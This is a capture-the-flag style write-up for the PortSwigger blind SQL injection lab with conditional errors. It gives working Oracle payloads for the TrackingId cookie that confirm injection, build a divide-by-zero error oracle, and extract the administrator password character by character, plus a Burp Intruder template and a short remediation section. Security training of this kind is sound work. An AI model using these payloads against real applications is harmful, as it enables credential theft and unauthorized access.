# Lab 12 — Blind SQL injection with conditional errors

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | Blind SQLi |
| **Concept** | [09 — Blind SQLi](https://portswigger.net/web-security/sql-injection) · [10 — Error-based](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors |

---

## 🎯 Objective
The `TrackingId` cookie is injectable, but the response is **identical** for TRUE and FALSE and shows no data. Induce a **conditional database error** to build the oracle, extract the `administrator` password, and **log in**. Engine: **Oracle**.

## 🧠 Background
When content doesn't change, make the difference an **error vs no error**. Trick: an expression that only evaluates its dangerous half when the condition is TRUE — classically a divide-by-zero (`TO_CHAR(1/0)`).

## 🪜 Methodology
1. **Prove SQL execution / find the syntax.** A single `'` breaks the query (error). Balance it with string concatenation:
   ```sql
   TrackingId=xyz'||(SELECT '' FROM dual)||'      → normal (200)
   TrackingId=xyz'||(SELECT '' FROM no_table)||'  → error (500)   ← confirms Oracle + injection
   ```
2. **Build the conditional error oracle**:
   ```sql
   TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   → error (TRUE)
   TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   → normal (FALSE)
   ```
3. **Confirm the admin user exists**:
   ```sql
   TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
   ```
   Error → the row exists.
4. **Find length**, then **extract characters** (error = TRUE):
   ```sql
   -- length
   TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
   -- nth character
   TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
   ```

## 💥 Intruder template
```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
- Cluster bomb: positions `1..20`, charset `a-z0-9`.
- **Grep-Match on the error** (or flag HTTP 500) to mark TRUE.

## ✅ Why it works
`CASE WHEN <cond> THEN 1/0 ELSE '' END` only divides by zero when the condition holds, so an HTTP 500 becomes a reliable TRUE signal even though page content never changes.

## 🛡️ Remediation
Parameterize; suppress verbose DB errors in production; least privilege. See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
No content diff? Manufacture one with a conditional error. `#sqli` `#practitioner` `#blind` `#oracle` `#error-based`
